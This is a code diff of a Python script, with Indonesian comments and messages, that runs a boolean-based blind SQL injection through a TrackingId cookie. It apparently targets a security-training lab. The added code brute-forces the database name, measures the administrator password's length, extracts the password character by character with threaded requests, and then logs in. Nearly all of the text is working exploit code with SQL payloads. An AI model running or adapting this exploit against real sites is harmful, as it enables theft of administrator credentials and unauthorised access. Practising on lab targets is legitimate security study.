@@ -7,7 +7,7 @@ charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
 def get_cookies_with_requests(url):
     try:
         session = requests.Session()
-        response = session.get(url)
+        session.get(url)
         cookies = session.cookies.get_dict()
         tracking_id = cookies.get('TrackingId')
         return tracking_id
@@ -22,6 +22,41 @@ def get_csrf_token(client, url):
     if csrf_token:
         return csrf_token['value']
     return None
+
+def try_database_char(base_url, tracking_id, position, char):
+    payload = f"' AND (SELECT substr(current_database(), {position}, 1))='{char}'--"
+    cookies = {
+        'TrackingId': tracking_id + payload
+    }
+
+    response = requests.get(base_url, cookies=cookies)
+
+    if "Welcome back!" in response.text:
+        print(f"Karakter ke-{position} dari nama database benar: {char}")
+        return char
+    else:
+        print(f"Karakter ke-{position} dari nama database salah: {char}")
+    return None
+
+def bruteforce_database_name(base_url, tracking_id, threads):
+    database_name = ''
+    position = 1
+    while True:
+        found_char = None
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(try_database_char, base_url, tracking_id, position, char) for char in charset]
+
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    found_char = result
+                    database_name += result
+                    break
+        
+        if found_char is None:  # Jika tidak ada karakter yang ditemukan, berarti nama database selesai
+            break
+        position += 1
+    return database_name
 
 def try_password_char(base_url, tracking_id, position, char):
     payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--"
@@ -38,16 +73,31 @@ def try_password_char(base_url, tracking_id, position, char):
         print(f"Karakter ke-{position} salah: {char}")
     return None
 
-def bruteforce_password(base_url, tracking_id, threads):
+def length_password(base_url, tracking_id):
+    length = 0
+    while True:
+        payload = f"' and (SELECT username from users where username='administrator' and LENGTH(password)>{length})='administrator'--"
+        cookies = {
+            'TrackingId': tracking_id + payload
+        }
+        response = requests.get(base_url, cookies=cookies)
+
+        if "Welcome back!" in response.text:
+            length += 1
+        else:
+            break
+    return length
+
+def bruteforce_password(base_url, tracking_id, threads, length):
     password = ''
-    for position in range(1, 21):
+    for position in range(1, length+1):
         with ThreadPoolExecutor(max_workers=threads) as executor:
             futures = [executor.submit(try_password_char, base_url, tracking_id, position, char) for char in charset]
 
             for future in as_completed(futures):
                 result = future.result()
                 if result:
-                    password += result
+                    password += result  # Append karakter yang benar
                     break
     return password
 
@@ -75,11 +125,22 @@ def main():
 
     if tracking_id:
         print(f"TrackingId: {tracking_id}")
-        password = bruteforce_password(base_url, tracking_id, threads)
+        
+        # Cek nama database
+        print("\nMemulai brute-force nama database...")
+        database_name = bruteforce_database_name(base_url, tracking_id, threads)
+        print(f"Nama database yang ditemukan: {database_name}")
+
+        # Cek panjang password
+        length = length_password(base_url, tracking_id)
+        print(f"Panjang Password: {length}")
+        
+        # Brute-force password
+        password = bruteforce_password(base_url, tracking_id, threads, length)
         print(f"\nPassword administrator yang ditemukan: {password}")
-        login_condition = login(base_url, password)
+        login(base_url, password)        
     else:
         print("Gagal mendapatkan TrackingId.")
 
-if __name__ == '__main__':
+if __name__ == '__main__':                                  
     main()
